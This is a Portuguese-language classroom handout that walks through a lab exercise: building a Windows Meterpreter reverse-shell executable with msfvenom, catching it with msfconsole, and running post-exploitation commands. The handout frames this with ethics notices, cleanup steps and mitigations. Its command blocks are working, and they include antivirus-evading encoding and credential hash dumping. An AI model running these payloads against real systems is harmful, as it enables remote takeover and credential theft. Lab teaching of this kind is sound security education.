# Handout — msfvenom + msfconsole

## Aviso ético e legal

Este material destina-se **apenas** a fins educacionais, em ambientes controlados (laboratórios com VMs isoladas). Qualquer ação em sistemas reais sem autorização por escrito é ilegal (ex.: art. 154-A do Código Penal Brasileiro) e viola normas de privacidade (LGPD). Antes de qualquer teste, obtenha um documento de autorização (Rules of Engagement). O foco do exercício é aprender técnicas para melhorar a defesa: aplicação de patches, configuração de firewall e atualização de antivírus.

---

## Objetivo

Gerar um payload com `msfvenom` (executável Windows) e receber uma conexão reversa com `msfconsole` (Meterpreter). O objetivo é demonstrar o fluxo de um ataque controlado para fins pedagógicos e mostrar contramedidas.

---

## Nível e requisitos

- **Nível:** intermediário — conhecimentos básicos de Linux e redes.  
- **Máquina atacante:** Kali Linux com Metasploit (`msfvenom`, `msfconsole`) atualizado.  
- **Máquina alvo (demo):** VM Windows (7/10) em rede isolada (Host-only / Internal).  
- **Rede:** ambos os hosts na mesma sub-rede (ex.: `192.168.56.0/24`).  
- **Ferramentas mínimas:** `msfvenom`, `msfconsole`, `nmap`, `sqlmap` (opcional).  

**Observação:** não execute este material em infraestruturas de terceiros ou em redes de produção.

---

## Preparação rápida do laboratório

1. Crie duas VMs: Kali (atacante) e Windows (alvo).  
2. Configure a rede das VMs para Host-Only ou Internal Network.  
3. Anote os IPs: em Kali use `ip addr show`; em Windows use `ipconfig`.  
4. No Windows de laboratório, desligue temporariamente AV/firewall apenas para a demo e restaure após o exercício.  
5. Faça snapshot das VMs antes de iniciar (facilita restauração).

---

## Passo a passo

### 1. Identificar IP do atacante (LHOST)
No Kali:

```bash
ip addr show | grep inet
# Identifique o IP na interface usada (ex.: 192.168.56.100)
```

Anote o IP (LHOST) que será usado no payload e no handler.

---

### 2. Gerar payload com msfvenom

No Kali, gere um executável para Windows (exemplo x64 Meterpreter reverse TCP):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o /home/kali/payload.exe
```

Explicação rápida:

* `-p`: payload a usar.
* `LHOST`: IP do Kali.
* `LPORT`: porta de escuta (escolha livre, ex.: 4444).
* `-f exe`: formato executável Windows.
* `-o`: caminho e nome do arquivo de saída.

**Opcional — ofuscação / encoder:**
Se o antivírus detectar o executável, pode testar ofuscação:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o /home/kali/payload_encoded.exe
```

* Teste sempre em ambiente controlado. Não distribua arquivos maliciosos.

---

### 3. Transferir o payload para a VM alvo

Métodos:

* Pasta compartilhada (VirtualBox: Devices > Shared Folders).
* `scp`/sftp (se houver servidor SSH na VM):

  ```bash
  scp /home/kali/payload.exe user@192.168.56.101:/C/Users/Public/Desktop/
  ```
* Arraste e solte via interface do hypervisor (quando suportado).

**Importante:** garanta que a transferência e execução ocorram apenas na VM de laboratório.

---

### 4. Configurar o listener (handler) no msfconsole

1. Inicie Metasploit:

```bash
msfconsole
```

2. Carregue o módulo handler:

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.100
set LPORT 4444
show options   # verifique as configurações
exploit         # inicia o listener
```

O console deverá exibir `Listening for connections...`.

---

### 5. Executar o payload na máquina alvo

Na VM Windows (apenas no laboratório), execute `payload.exe` (duplo clique ou via CMD).
No `msfconsole` deverá aparecer a conexão:

```bash
[*] Started reverse TCP handler on 192.168.56.100:4444
[*] Meterpreter session 1 opened ...
```

Entrar na sessão:

```bash
sessions -l
sessions -i 1
# agora o prompt será 'meterpreter >'
```

---

### 6. Comandos básicos no Meterpreter

Exemplos úteis para demonstração:

```bash
sysinfo        # informações do sistema remoto
getuid         # usuário corrente
screenshot     # captura tela do host remoto (salva no Kali)
shell          # abre um shell CMD no Windows
upload <local> <remoto>   # envia arquivo do Kali para a VM
hashdump       # extrai hashes (requer privilégios)
background     # coloca a sessão em background
```

Para finalizar todas as sessões:

```bash
sessions -K
```

---

## Troubleshooting (problemas comuns e soluções)

* **"No such module: multi/handler"** — Metasploit desatualizado. Solução: `sudo msfupdate` e reinicie.
* **msfvenom informa LHOST inválido** — Use o IP real do Kali (verificado com `ip addr`).
* **Timeout / sem conexão** — Verifique conectividade (ping), firewall no Windows e regras de rede do hypervisor.
* **AV detecta o payload** — Teste em VM sem AV; use ofuscação apenas para demonstração controlada; explique limites das técnicas.
* **Payload não executa** — Verifique arquitetura do alvo (x86 vs x64) e permissões de execução.
* **Permissões de escrita ao salvar o payload** — use caminhos com permissão (`/tmp` ou `sudo`).

Dica: ative `spool /tmp/msf.log` no msfconsole para gravar sessão em log.

---

## Cleanup e restauração do ambiente

1. No msfconsole, finalize sessões:

```bash
sessions -K
```

2. No Kali, remova arquivos gerados:

```bash
rm /home/kali/payload*
```

3. Na VM Windows, remova o executável e reative AV e firewall.
4. Restaure snapshots das VMs para garantir estado limpo.
5. Se necessário, limpe o banco de dados Metasploit (`db_destroy`) — use com cuidado.

---

## Medidas de mitigação (o que ensinar além do ataque)

* Aplicar patches e atualizações de segurança.
* Desabilitar protocolos inseguros (p.ex., SMBv1).
* Configurar firewall para minimizar portas expostas.
* Implementar antivírus/EDR com assinatura e heurística atualizadas.
* Uso de autenticação forte e MFA.
* Monitoramento de logs e alertas (SIEM).

---

## Recursos e referências

* Metasploit (documentação e módulos): OffSec / Rapid7.
* Artigos e laboratórios: TryHackMe (sala Metasploit), HackTheBox.
* Vídeos didáticos: buscas por "Metasploit reverse shell demo" em fontes confiáveis.
* NVD / CVE: consulta de vulnerabilidades específicas.

---

## Checklist de autorização (modelo rápido)

* Responsável pelo ativo: __________________________
* IPs/VMs autorizadas: _____________________________
* Escopo permitido: _______________________________
* Período do teste: _______________________________
* Assinatura do responsável: ________________________

---

## Atenção

Use este handout para demonstrar os conceitos de forma segura e didática. Enfatize sempre a ética e as medidas de defesa associadas. Qualquer material gerado durante a aula (payloads, logs) deve ser mantido apenas no laboratório e removido ao final da atividade.
